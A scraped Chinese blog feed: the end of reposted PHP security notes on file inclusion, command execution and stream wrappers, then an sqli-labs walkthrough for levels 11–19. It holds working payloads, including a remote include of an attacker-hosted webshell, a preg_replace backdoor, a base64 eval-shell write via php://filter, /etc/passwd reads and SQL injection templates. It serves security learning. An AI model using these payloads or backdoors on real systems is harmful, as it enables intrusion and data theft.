<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">require_once <span class="string">&quot;http://attacker/phpshell.txt?/action/m_share.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
<p>普通远程文件包含</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=[<span class="type">http</span>|<span class="type">https</span>|<span class="type">ftp</span>]://example.com/shell.txt</span><br></pre></td></tr></table></figure>

<h1 id="13-命令执行"><a href="#13-命令执行" class="headerlink" title="13. 命令执行"></a>13. 命令执行</h1><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert 函数的参数可以为布尔类型的值，也可以是字符串，当参数为字符串时，会被当作 PHP 代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以执行 php 代码</span></span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;flag&#x27;.system(\&quot;ls\&quot;).&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// 这里构造后的新字符串如下，</span></span><br><span class="line"><span class="comment">// strpos(&#x27;templates/&#x27;.system(&quot;ls&quot;).&#x27;.php&#x27;, &#x27;..&#x27;) === false</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当test.php?a=phpinfo()时，phpinfo()会被执行。</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">assert(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号 `"></a>反引号 `</h2><p>反引号 ` 可以调用 shell_exec 正常执行代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">`$_GET[<span class="type">v</span>]` 相当于 shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line"></span><br><span class="line">`$_GET[<span class="string">&#x27;v&#x27;</span>]` 变量 v 前后不能有单引号</span><br></pre></td></tr></table></figure>

<p>system，exec，shell_exec 的区别</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>，<span class="variable">$return_var</span>);</span><br><span class="line">system()会将输出内容直接印出，所以若于网页，会将所有回传内容都显示于页面上。</span><br><span class="line"><span class="variable">$last_line</span>：只能取得最后一行的内容</span><br><span class="line"><span class="variable">$return_var</span>：取得系统状态回传码</span><br><span class="line"></span><br><span class="line">exec()</span><br><span class="line">exec(<span class="string">&#x27;ls&#x27;</span>，<span class="variable">$output</span>，<span class="variable">$return_var</span>);</span><br><span class="line"><span class="variable">$output</span>：回传内容都会存于此变数中(储存成阵列)，不会直接秀在页面上。</span><br><span class="line"><span class="variable">$return_var</span>：取得系统状态回传码</span><br><span class="line"></span><br><span class="line">shell_exec()</span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="variable">$output</span>：回传内容都会存于此变量中(储存成纯文字内容)，不会直接显示在页面上。</span><br></pre></td></tr></table></figure>

<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>触发条件：</p>
<pre><code>第一个参数需要e标识符，有了它可以执行第二个参数的命令
第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：
</code></pre>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">// 这样是可以执行命令的</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">&#x27;/test/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;just test&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">// 这种没有匹配上，所以返回值是第三个参数，不会执行命令</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">&#x27;/test/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;just tesxt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我们可以构造这样的后门代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;//e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>], <span class="string">&quot;Access Denied&quot;</span>);  </span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="string">&quot;/test/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>], <span class="string">&quot;jutst test&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>当访问这样这样的链接时就可以被触发</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://localhost:<span class="number">8000</span>/testbug.php?<span class="built_in">h</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<h1 id="14-伪协议"><a href="#14-伪协议" class="headerlink" title="14. 伪协议"></a>14. 伪协议</h1><p>可以应用于</p>
<ul>
<li>file_get_contents</li>
</ul>
<ul>
<li>readfile</li>
</ul>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>读取文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/lfi.php?file=php://<span class="keyword">filter</span>/convert.base64<span class="literal">-encode</span>/resource=flag.php</span><br><span class="line">/lfi.php?file=php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>控制文件写入的处理逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;&lt;?php exit;?&gt;&quot;</span>; </span><br><span class="line">@<span class="variable">$c</span>.=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">@<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">@file_put_contents(<span class="variable">$filename</span>, <span class="variable">$c</span>); </span><br><span class="line">highlight_file(<span class="string">&#x27;tmp.php&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 先对内容做base64-decode，然后再写入文件</span></span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=abc.php&amp;c=0PD9waHAgQGV2YWwoJF9SRVFVRVNUWydoJ10pOz8%2B</span></span><br><span class="line"><span class="comment"># php 在做 base64_decode 的时候会自动去掉无法解析的字符&lt;?php exit;?&gt;会变成phpexit，因为base64是每4个字符进行解析的，因此前面加上任意字符补全，注意如果base64里面有+号，要记得 urlencode</span></span><br></pre></td></tr></table></figure>

<p>利用伪协议就可以绕过 php 的 is_file，然后读取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;php://filter/resource=123.php&#x27;</span>;</span><br><span class="line"><span class="comment">// boolean true</span></span><br><span class="line">var_dump(is_file(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// boolean false</span></span><br><span class="line">var_dump(is_file(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>写入文件， 数据在body那边传过去，可以用GET，也可以用 POST 传过去</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/test.php?file=php://input</span><br></pre></td></tr></table></figure>

<p>将 user 用 body 传过去，注意 body 那边不是表单的形式，是直接把 body 的数据整个提交</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">GET /?user=php://input HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.255</span>.<span class="number">10.157</span>:<span class="number">8087</span></span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">17</span></span><br><span class="line"></span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure>

<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>将 include 的文件流重定向到用户控制的输入流</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/test.php?file=<span class="keyword">data</span>://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</span><br></pre></td></tr></table></figure>

<p>可以用于控制 file_get_contents 的内容为用户输入的流</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>

<p>file_get_contens支持data协议，并且可以指定任意的域名，利用 data://yourname.auu/data/plain;base64,xxx 这样的 payload 绕过 php 的 parse_url 对域名和路径的限制。</p>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。</p>
<p>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>这里的路径为上传的 jpg 文件在服务器的路径</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/index.php?id=phar://路径/xxx.jpg/shell</span><br></pre></td></tr></table></figure>

<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>上述 phar:// 的方法也可以使用 zip://</p>
<p>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。</p>
<p>1.zip文件内仅有1.php这个文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/php?file=zip://<span class="number">1</span>.png%<span class="number">231</span>.php  </span><br><span class="line"></span><br><span class="line">// 也可以尝试不改名为png，直接使用zip上传测试一下</span><br><span class="line">/php?file=zip://<span class="number">1</span>.zip%<span class="number">231</span>.php</span><br></pre></td></tr></table></figure>

<h2 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 redis 中的 info 数据</span></span><br><span class="line">/index.php?url=dict://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>/info</span><br><span class="line"><span class="comment"># 查看 ssh 的 banner</span></span><br><span class="line">/index.php?url=dict://<span class="number">127.0</span>.<span class="number">0.1</span>:ssh端口/info</span><br></pre></td></tr></table></figure>

<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/ssrf.php?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">// 利用 ﬁle://localhost 来读取本地文件</span><br><span class="line">/index.php?url=file://localhost/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line"><span class="comment">## 文件上传漏洞</span></span><br><span class="line"> </span><br><span class="line">正常的文件上传流程是这样的，首先接收 POST 的文件，在 `t<span class="built_in">mp</span>` 目录下生成临时文件，文件名是 `php[<span class="type">A</span>-<span class="type">Za</span>-<span class="type">z0</span>-<span class="number">9</span>]&#123;<span class="number">6</span>&#125;`，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 `/tmp` 目录下可以留下任何内容。 内容构造好后，单纯爆破  `/tmp/phpxxxxxx`  文件名是不太现实但是也可行的。</span><br><span class="line"> </span><br><span class="line">通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 一些函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### stripos/strpos</span></span><br><span class="line"></span><br><span class="line">stripos() 函数返回字符串在另一个字符串中第一次出现的位置，如果没有找到该字符串，则返回 false。该函数对大小写不敏感，strpos() 函数是大小写敏感的。但是在返回值为<span class="number">0</span>的情况下，弱类型比较下 <span class="number">0</span> == false</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$r</span>, <span class="string">&#x27;a&#x27;</span>) == false) &#123;</span><br><span class="line">       // <span class="number">0</span> 是 <span class="variable">$r</span>存在字符串 <span class="string">&#x27;a&#x27;</span>，但是由于<span class="number">0</span>和false是相等的，所以就执行了这里</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$r</span>, <span class="string">&#x27;a&#x27;</span>) === false) &#123;</span><br><span class="line">     // 这种情况下，<span class="variable">$r</span> 中必须不包含 <span class="string">&#x27;a&#x27;</span>，才会执行这里</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos([], <span class="string">&quot;a&quot;</span>) !==false) &#123;</span><br><span class="line">    // strpos()找的是字符串，那么传一个数组给它，strpos()出错返回null，null !== false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="eregi"><a href="#eregi" class="headerlink" title="eregi"></a>eregi</h2><p>eregi() 函数在一个字符串搜索指定的正则表达式的字符串，搜索不区分大小写，区分大小写使用 eregi，如果匹配成功返回 true，否则则返回 false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (! eregi (<span class="string">&quot;[[:alnum:]]&#123;8,10&#125;&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&quot;Invalid password! Passwords must be from 8 - 10 chars&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;Valid password&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="stristr"><a href="#stristr" class="headerlink" title="stristr"></a>stristr</h2><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 strstr() 函数。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">// string，规定被搜索的字符串。</span><br><span class="line">// search，规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</span><br><span class="line">stristr(string, search, before_search)</span><br><span class="line">// before_search 为可选参数，默认值为 <span class="string">&quot;false&quot;</span> 的布尔值。</span><br><span class="line">// 如果设置为 <span class="string">&quot;true&quot;</span>，它将返回 search 参数第一次出现之前的字符串部分。</span><br></pre></td></tr></table></figure>

<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><p>iconv 函数用于做编码转换，函数原型</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">string iconv ( string <span class="variable">$in_charset</span> , string <span class="variable">$out_charset</span> , string <span class="variable">$str</span> ) </span><br><span class="line">in_charset：输入的字符集 </span><br><span class="line">out_charset：输出的字符集 </span><br><span class="line">str：要转换的字符串</span><br></pre></td></tr></table></figure>
<p>iconv 在字符编码转换时可能导致字符串截断。当$str 中有一个字符不能被目标字符集所表示时，$str 从第一个无效字符开始截断并导致一个 E_NOTICE。 例如：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$d</span> = iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;gb2312&quot;</span>, <span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>该代码是将变量 $c 从UTF-8 编码转换为 gb2312。那么当 $c 中存在一个不能被 gb2312 表示的字符时，那么就会截断。</p>
<h2 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h2><p>PHP 的字符串向数据库进行写入时，为避免数据库错误，需要对特殊字符进行转义（字符前加上 \）。特殊字符：单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。</p>
<ul>
<li>addslashes 对特殊字符加上转义字符，返回一个字符串</li>
<li>stripslashes 该函数为 addslashes() 的反函数，去掉转义字符串，返回一个字符串</li>
</ul>
<h2 id="strtr"><a href="#strtr" class="headerlink" title="strtr"></a>strtr</h2><p>转换字符串中特定的字符，如果 from 和 to 参数的长度不同，则会被格式化为最短的长度。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">strtr(string,from,to)</span><br><span class="line">strtr(string,array)</span><br><span class="line"><span class="comment"># 按字符做替换，from 中每个字符替换成 to 中对应顺序的字符</span></span><br><span class="line"><span class="comment"># 12341111234</span></span><br><span class="line">var_dump(strtr(<span class="string">&#x27;abcd111abcd&#x27;</span>, <span class="string">&#x27;abcd&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>数组形式的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span> =&gt; <span class="string">&quot;Hi&quot;</span>, <span class="string">&quot;world&quot;</span> =&gt; <span class="string">&quot;earth&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> strtr(<span class="string">&quot;Hello world&quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>格式化字符串</p>
<ul>
<li><p>sprintf， 把格式化的字符串写入变量中</p>
</li>
<li><p>vsprintf，与 sprintf 功能相同，但是 vsprintf 中的参数位于数组中</p>
</li>
<li><p>fprintf，把格式化的字符串写入指定的输出流（例如：文件或数据库）</p>
</li>
<li><p>vfprintf，与 fprintf 功能相同，但是 vfprintf 中的参数位于数组中</p>
</li>
<li><p> printf，输出格式化的字符串</p>
</li>
<li><p> vprintf，与 printf 功能相同，但是 vprintf 中的参数位于数组中</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$number</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Shanghai&quot;</span>;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;在%s有 %u 百万辆自行车。&quot;</span>,<span class="variable">$str</span>,<span class="variable">$number</span>);</span><br><span class="line">vprintf(<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$txt</span> = sprintf(<span class="string">&quot;There are %u million cars in %s.&quot;</span>, <span class="variable">$number</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$txt</span> = vsprintf(<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> fprintf(<span class="variable">$file</span>,<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="variable">$number</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> vfprintf(<span class="variable">$file</span>,<span class="string">&quot;There are %u million bicycles in %s.&quot;</span>,<span class="keyword">array</span>(<span class="variable">$number</span>,<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure>

<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>curl是支持 file://host/path, file://path 这两种形式，但是即使有 host, curl仍然会访问到本地的文件。用 ? 或者 # 可以截断 url 后面拼接的 /, payload: file://<a href="http://www.baidu.com/etc/flag">www.baidu.com/etc/flag</a>?</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$host</span> !== <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;wrong site&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ci</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ci</span>, CURLOPT_URL, <span class="variable">$request_url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ci</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$res</span> = curl_exec(<span class="variable">$ci</span>);</span><br><span class="line">curl_close(<span class="variable">$ci</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>

<p>PHP的cURL支持通过给 CURL_POSTFIELDS 传递关联数组（而不是字符串）来生成 multipart/form-data 的POST请求。可以使用“@+文件全路径”的语法附加文件，将会读取该文件内容，并作为POST请求的内容。</p>
<p>注：<font color='red'>PHP5.4及以下版本仅支持@语法形式；PHP5.5两种都是支持的，设置 CURL_SAFE_UPLOAD＝true 强制使用CURLFile方式；PHP5.6+仅支持CURLFile方式，即使设置CURL_SAFE_UPLOAD＝false也是毫无意义的。</font></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">120.55</span>.<span class="number">42.243</span>:<span class="number">20010</span>/index.php?url=<span class="selector-tag">@</span>/opt/api/dnsapi/views.py</span><br></pre></td></tr></table></figure>

<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><ul>
<li>ctype_upper 检查是否为大写字符</li>
<li>htmlentities 将字符转换为 HTML 转义字符</li>
<li>implode 将数组拼接成字符串</li>
</ul>
<h1 id="15-数据库相关"><a href="#15-数据库相关" class="headerlink" title="15. 数据库相关"></a>15. 数据库相关</h1><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h2><p>转义 SQL 语句中使用的字符串中的特殊字符，会转义单引号和双引号，下列字符受影响：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">\x1a</span></span><br></pre></td></tr></table></figure>

<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<h2 id="数据库字符集绕过"><a href="#数据库字符集绕过" class="headerlink" title="数据库字符集绕过"></a>数据库字符集绕过</h2><p>在默认情况下，mysql字符集为 latin1，而执行了 set names utf8 以后，character_set_client、character_set_connection、character_set_results等与客户端相关的配置字符集都变成了 utf8，但character_set_database、character_set_server 等服务端相关的字符集还是 latin1。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$db</span> = mysql_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line">mysql_select_db(<span class="variable">$database</span>,<span class="variable">$db</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// username=admin%c2，在mysql中可以正常查出 username=&#x27;admin&#x27; 的结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;SELECT * FROM z_users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>character_set_client 和 character_set_connection 被设置成了utf8，而内部操作字符集其实也就是username 字段的字符集还是默认的 latin1。于是整个操作就有如下字符串转换过程：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>

<p>最后执行比较username=’admin’ 的时候，’admin’ 是一个latin1字符串。Mysql在转换字符集的时候，将不完整的字符给忽略了。</p>
<hr>
<p>转发自大佬博客：<a href="https://www.restran.net/2016/09/26/php-security-notes/">https://www.restran.net/2016/09/26/php-security-notes/</a></p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs (11-20)</title>
    <url>/2020/04/06/sqli-labs(11-20)/</url>
    <content><![CDATA[<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>post传输</p>
<p>使用hackbar构建payload，当输入<code>uname=admin&amp;passwd=admin&amp;submit=Submit</code>时显示:</p>
<div align="center"><img width=500 height=100 src="https://ftp.bmp.ovh/imgs/2020/05/92dea629a9e62722.png"></div>

<p>当输入<code>uname=admin&#39;&amp;passwd=admin&amp;submit=Submit</code>时显示：</p>
<div align="center"><img width=500 height=100  src="https://ftp.bmp.ovh/imgs/2020/05/17beb7d14d18b968.png"></div>

<p>输入<code>uname=&#39;or 1=1 #&amp;passwd=admin&amp;submit=Submit</code>,仍然显示成功<br>然后按照之前的order by 步骤进行注入，不过注入方式是post。</p>
<p><strong>注意：</strong>在进行post注入的时候注释符用的是“#”而不是“–+”，原因是在get中涉及到了转码的问题，在post中使用“–+”是无效的。</p>
<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与11关基本相同，就是把单引号改为双引号然后加上一个单括号，从而进行注入</p>
<p>模版是<code>uname=&quot; or（此为要构造的） #&amp;passwd=admin&amp;submit=Submit</code></p>
<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>与11关部分相同，给单引号后面加上一个单括号，从而进行注入。但是发现页面只是单纯回显错误或者成功，所以我们可以采用盲注的方法，按照前面所用的时间盲注的方法进行注入。<br>可以用burpsuit辅助，速度能相对快一点，至于脚本后面会有所提及。</p>
<p>模版是<code>uname=&#39;) or（此为要构造的）#&amp;passwd=admin&amp;submit=Submit</code></p>
<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>与第13关基本相同。<br>模版是<code>uname=&quot; or（此为要构造的）#&amp;passwd=admin&amp;submit=Submit</code><br>‘ “ ) 1=1</p>
<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>除了注入的位置之外，其它步骤均与上面相同<br>模版是<code>uname=admin&amp;passwd=&#39; or（此为要构造的） #&amp;submit=Submit</code></p>
<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>与15关基本相同，只需将单引号变为双引号和单括号<br>模版是：<code>uname=admin&amp;passwd=&quot;) or（此为要构造的） #&amp;submit=Submit</code></p>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p><font color='ligreen'><b>基础知识补充：</b></font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml</span><br><span class="line">参考资料：</span><br><span class="line">        https://www.jb51.net/article/125599.htm</span><br><span class="line">        https://www.jb51.net/article/125607.htm</span><br></pre></td></tr></table></figure>
<p>这一关要以知道用户名字为前提，然后才能进行后面的操作。</p>
<p>模版为： <code>uname=admin&amp;passwd=&#39; and updatexml(1,concat(0x7e,(要构造的)),1) #&amp;submit=Submit</code></p>
<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>此时要使用第17关重新设置的密码进行登录，不然会报错。可以通过数据库的命令行，查看admin对应的密码。</p>
<div align="center"><img width=500 src="https://ftp.bmp.ovh/imgs/2020/05/7ea1f9649e3ec846.png"></div>
这一关用上面的方法是不可能成功的，页面有显示ip地址和user agent，所以猜想与http头部协议有关，burpsuit用起来。
发现可以在user agent处进行注入。

<ul>
<li>模版为：<code>&#39; or updatexml(1,concat(0x7e,(要构造的)),1) or &#39;1&#39;=&#39;1</code></li>
<li>模版为： <code>&#39; or updatexml(1,concat(0x7e,(要构造的)),1),&#39;&#39;,&#39;&#39;)#</code></li>
</ul>
<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>与18关基本相同。登录成功显示referer信息，登录失败没有回显信息。分析后得知，需要进行闭合操作，两种方法：</p>
<ul>
<li>模版为：<code>&#39; or updatexml(1,concat(0x7e,(要构造的)),1) and &#39;1&#39;=&#39;1</code></li>
